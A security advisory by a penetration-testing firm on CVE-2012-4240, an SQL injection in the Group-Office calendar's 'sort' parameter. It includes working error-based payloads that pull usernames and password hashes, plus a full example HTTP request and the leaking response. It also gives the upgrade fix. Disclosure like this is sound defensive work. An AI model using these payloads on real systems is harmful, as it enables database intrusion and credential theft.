@@ -1,0 +1,134 @@
+/-------------------------------------\
+| Group-Office Calendar SQL Injection |
+\-------------------------------------/
+
+
+Summary
+=======
+
+Versions of Group-Office (a web app for online collaboration) prior to
+4.0.90 are subject to a SQL injection vulnerability located in the calendar
+module. A PHP file, used to serve data in the JSON format, does not
+sufficiently sanitise a user-supplied parameter injected into the ORDER BY
+part of an SQL query. An attacker can leverage this flaw to extract
+information from the database via SQL errors.
+
+CVE number: CVE-2012-4240
+Impact: High
+Vendor homepage: http://www.group-office.com/
+Vendor notified: 19/07/2012
+Credit: Chris Cooper and Joseph Sheridan
+Homepage: http://www.reactionpenetrationtesting.co.uk/
+
+This advisory is posted at:
+
+http://www.reactionpenetrationtesting.co.uk/group-office-sqli.html
+
+
+Affected Products
+======== ========
+
+Confirmed in Group-Office community 4.0.71, 4.0.73 and 4.0.88. Other
+versions may also be affected.
+
+
+Details
+=======
+
+A 'sort' parameter on the page /modules/calendar/json.php was found to be
+subject to a SQL injection vulnerability. It was possible to inject
+arbitrary SQL statements into an ORDER BY clause, retrieving information
+from the database via an error message. The attacker must be authenticated
+as a valid user in order for the attack to be successful.
+
+Injecting the following SQL code into the 'sort' parameter will trigger the
+vulnerability, retrieving the first user's username. Changing 'username' to
+'password' retrieves their hashed password. For version 4.0.71:
+
+ExtractValue(1,CONCAT(0x5c,(SELECT username FROM go_users LIMIT 1)))
+
+Or for versions 4.0.73 and 4.0.88:
+
+id`,ExtractValue(1,CONCAT(0x5c,(SELECT username FROM go_users LIMIT 1)))#
+
+
+---
+Example Request (version 4.0.71):
++--------------------------------
+
+POST /groupoffice/modules/calendar/json.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 162
+Cookie: groupoffice=tgocfuhoh7lrqo0mckfef4us04; GO_LANGUAGE=en_UK
+
+sort=ExtractValue(1,CONCAT(0x5c,(SELECT%20username%20FROM%20go_users%20LIMIT
+%201)))&dir=ASC&task=writable_views&limit=20&security_token=pfi5lckw3r9qm64n
+adgb
+
+
+---
+Example Response (version 4.0.71):
++---------------------------------
+
+HTTP/1.1 200 OK
+Date: Fri, 20 Jul 2012 14:16:09 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Content-Length: 397
+Content-Type: text/html; charset=UTF-8
+
+{"feedback":"<b>Database error:<\/b> Invalid SQL: SELECT SQL_CALC_FOUND_ROWS
+v.* FROM cal_views v INNER JOIN go_acl a ON (v.acl_id = a.acl_id AND
+a.level>10 AND (a.user_id=1 OR a.group_id IN (1,2,3)))  GROUP BY v.id ORDER
+BY ExtractValue(1,CONCAT(0x5c,(SELECT username FROM go_users LIMIT 1))) ASC
+LIMIT 0,20<br>\n<b>MySQL Error<\/b>: 1105 (XPATH syntax error:
+'\\admin')<br>\n","success":false}
+
+
+Impact
+======
+
+An authenticated attacker might be able to take control of the database
+within the context of the MySQL user, and potentially use this as leverage
+to further compromise the host machine.
+
+
+Solution
+========
+
+Upgrade to Group-Office community 4.0.90.
+
+
+Distribution
+============
+
+In addition to posting on the website, a text version of this notice has
+been posted to the following e-mail and Usenet news recipients.
+
+* bugtraq () securityfocus com
+* full-disclosure () lists grok org uk
+
+Future updates of this advisory, if any, will be placed on the ReactionIS
+corporate website, but may or may not be actively announced on mailing lists
+or newsgroups. Users concerned about this problem are encouraged to check
+the URL below for any updates:
+
+
+http://www.reactionpenetrationtesting.co.uk/group-office-sqli.html
+
+============================================================================
+==
+
+Reaction Information Security 
+Lombard House Business Centre,
+Suite 117,
+12-17 Upper Bridge Street,
+Canterbury, Kent, CT1 2NF
+
+Phone: +44 (0)1227 785050
+Email: research () reactionis {dot} co {dot} uk
+Web: http://www.reactionpenetrationtesting.co.uk
